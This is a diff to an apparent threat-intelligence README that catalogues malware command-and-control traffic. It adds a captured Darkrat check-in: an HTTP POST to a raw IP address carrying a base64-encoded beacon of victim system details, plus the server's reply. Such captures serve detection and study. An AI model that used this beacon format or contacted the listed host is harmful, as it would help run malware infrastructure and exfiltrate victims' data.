@@ -48,6 +48,29 @@ BF7CAB464EFBA57DAD495BECB15D8B4C57F0BE821AEF052DF1C27F08DDFC328EB3FE9F5699707BCD
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkcomet.png "Darkcomet")
 
+#### Darkrat
+~~~
+POST /request HTTP/1.1
+Accept: text/plain
+Content-Type: application/x-www-form-urlencoded
+User-Agent: agent
+Host: 104.244.75.179
+Content-Length: 640
+
+request=YUhkcFpEMDVNREExT1dNek55MHhNekl3TFRReFlUUXRZalU0WkMweVlqYzFZVGs0TlRCa01tWW1ZMjl0Y0hWMFpYSnVZVzFsUFZWVFJWSXRVRU1tWVc5eWJtOTBQV1poYkhObEptbHVjM1JoYkd4bFpGSmhiVDB6TGpRNU9UWXhPU1p1WlhSR2NtRnRaWGR2Y21zeVBYUnlkV1VtYm1WMFJuSmhiV1YzYjNKck16MTBjblZsSm01bGRFWnlZVzFsZDI5eWF6TTFQWFJ5ZFdVbWJtVjBSbkpoYldWM2IzSnJORDEwY25WbEptRnVkR2wyYVhKMWN6MG1ZbTkwZG1WeWMybHZiajB5TGpJdU1DWm5jSFZPWVcxbFBXUkhPV3RpZHowOUptTndkVTVoYldVOVUxYzFNRnBYZDI5VmFXdG5VVEk1ZVZwVGFGVlVVMnRuWVZSVmRFNXFVWGROUTBKRVZVWlZaMUZEUVhsTWFtTjNVakJvTmlaaGNtTm9QV1ZFWnpJbWIzQmxjbWx1WjNONWMzUmxiVDFXTW14MVdrYzVNMk41UVROSlJrNXNZMjVhY0ZreVZXZFZSMFpxWVhsQmVDWnpjSEpsWVdSMFlXYzljR0ZzYVhkaA==
+
+HTTP/1.1 200 OK
+Date: Tue, 08 Oct 2019 11:25:25 GMT
+Server: Apache/2.4.25 (Debian)
+Set-Cookie: PHPSESSID=hikrbr50pt7ggjr4rcbg40bvl6; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkrat.png "Darkrat")
+
 #### Emotet
 ~~~
 POST /mult/tlb/ HTTP/1.1
